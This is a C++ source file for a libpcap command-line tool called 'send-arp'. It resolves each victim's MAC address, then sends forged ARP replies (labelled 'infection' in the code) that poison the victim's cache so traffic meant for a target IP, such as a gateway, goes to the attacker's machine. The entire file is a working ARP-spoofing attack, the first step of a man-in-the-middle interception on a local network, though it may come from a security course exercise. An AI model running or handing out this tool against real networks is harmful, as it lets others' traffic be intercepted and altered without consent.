#include <arpa/inet.h>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth;
    ArpHdr arp;
};
#pragma pack(pop)

struct Session {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
};

void usage() {
    std::printf("syntax: send-arp <interface> <sender ip> <target ip> "
                "[<sender ip 2> <target ip 2> ...]\n");
    std::printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool parseIp(const char* text, Ip& ip) {
    in_addr address{};
    if (inet_pton(AF_INET, text, &address) != 1)
        return false;

    ip = Ip(ntohl(address.s_addr));
    return true;
}

bool getMyInfo(const char* dev, Mac& myMac, Ip& myIp) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        std::perror("socket");
        return false;
    }

    ifreq ifr{};
    std::strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        std::perror("SIOCGIFHWADDR");
        close(fd);
        return false;
    }
    myMac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        std::perror("SIOCGIFADDR");
        close(fd);
        return false;
    }

    auto* address = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
    myIp = Ip(ntohl(address->sin_addr.s_addr));
    close(fd);
    return true;
}

EthArpPacket makePacket(
    const Mac& ethDst, const Mac& ethSrc, uint16_t op,
    const Mac& arpSrcMac, const Ip& arpSrcIp,
    const Mac& arpDstMac, const Ip& arpDstIp) {
    EthArpPacket packet{};

    packet.eth.dmac_ = ethDst;
    packet.eth.smac_ = ethSrc;
    packet.eth.type_ = htons(EthHdr::Arp);

    packet.arp.hrd_ = htons(ArpHdr::ETHER);
    packet.arp.pro_ = htons(EthHdr::Ip4);
    packet.arp.hln_ = Mac::Size;
    packet.arp.pln_ = Ip::Size;
    packet.arp.op_ = htons(op);
    packet.arp.smac_ = arpSrcMac;
    packet.arp.sip_ = htonl(static_cast<uint32_t>(arpSrcIp));
    packet.arp.tmac_ = arpDstMac;
    packet.arp.tip_ = htonl(static_cast<uint32_t>(arpDstIp));

    return packet;
}

bool sendPacket(pcap_t* pcap, const EthArpPacket& packet) {
    int result = pcap_sendpacket(
        pcap,
        reinterpret_cast<const u_char*>(&packet),
        sizeof(packet)
    );

    if (result != 0) {
        std::fprintf(stderr, "send failed: %s\n", pcap_geterr(pcap));
        return false;
    }
    return true;
}

bool isSenderReply(
    const EthArpPacket& packet,
    const Mac& myMac,
    const Ip& myIp,
    const Ip& senderIp) {
    if (ntohs(packet.eth.type_) != EthHdr::Arp)
        return false;
    if (ntohs(packet.arp.op_) != ArpHdr::Reply)
        return false;

    Ip replySenderIp(ntohl(static_cast<uint32_t>(packet.arp.sip_)));
    Ip replyTargetIp(ntohl(static_cast<uint32_t>(packet.arp.tip_)));

    return replySenderIp == senderIp &&
           replyTargetIp == myIp &&
           packet.arp.tmac_ == myMac;
}

bool findSenderMac(
    pcap_t* pcap,
    const Mac& myMac,
    const Ip& myIp,
    const Ip& senderIp,
    Mac& senderMac) {
    EthArpPacket request = makePacket(
        Mac::broadcastMac(), myMac, ArpHdr::Request,
        myMac, myIp, Mac::nullMac(), senderIp
    );

    for (int attempt = 1; attempt <= 3; ++attempt) {
        if (!sendPacket(pcap, request))
            return false;

        auto deadline = std::chrono::steady_clock::now()
                      + std::chrono::seconds(2);

        while (std::chrono::steady_clock::now() < deadline) {
            pcap_pkthdr* header = nullptr;
            const u_char* data = nullptr;
            int result = pcap_next_ex(pcap, &header, &data);

            if (result == 0)
                continue;
            if (result < 0) {
                std::fprintf(stderr, "capture failed: %s\n", pcap_geterr(pcap));
                return false;
            }
            if (header->caplen < sizeof(EthArpPacket))
                continue;

            const auto* reply =
                reinterpret_cast<const EthArpPacket*>(data);

            if (!isSenderReply(*reply, myMac, myIp, senderIp))
                continue;

            senderMac = reply->arp.smac_;
            return true;
        }

        std::fprintf(stderr, "ARP timeout (%d/3)\n", attempt);
    }
    return false;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];
    std::vector<Session> sessions;

    for (int i = 2; i < argc; i += 2) {
        Session session{};
        if (!parseIp(argv[i], session.senderIp) ||
            !parseIp(argv[i + 1], session.targetIp)) {
            std::fprintf(stderr, "invalid IP address\n");
            return EXIT_FAILURE;
        }
        sessions.push_back(session);
    }

    Mac myMac;
    Ip myIp;
    if (!getMyInfo(dev, myMac, myIp))
        return EXIT_FAILURE;

    char errbuf[PCAP_ERRBUF_SIZE]{};
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (pcap == nullptr) {
        std::fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return EXIT_FAILURE;
    }

    bool success = true;

    for (Session& session : sessions) {
        if (!findSenderMac(pcap, myMac, myIp,
                           session.senderIp, session.senderMac)) {
            std::fprintf(stderr, "could not find sender MAC\n");
            success = false;
            continue;
        }

        EthArpPacket infection = makePacket(
            session.senderMac, myMac, ArpHdr::Reply,
            myMac, session.targetIp,
            session.senderMac, session.senderIp
        );

        if (!sendPacket(pcap, infection)) {
            success = false;
            continue;
        }

        std::string target = static_cast<std::string>(session.targetIp);
        std::string attacker = static_cast<std::string>(myMac);
        std::string sender = static_cast<std::string>(session.senderIp);
        std::printf("%s is-at %s sent to %s\n",
                    target.c_str(), attacker.c_str(), sender.c_str());
    }

    pcap_close(pcap);
    return success ? EXIT_SUCCESS : EXIT_FAILURE;
}

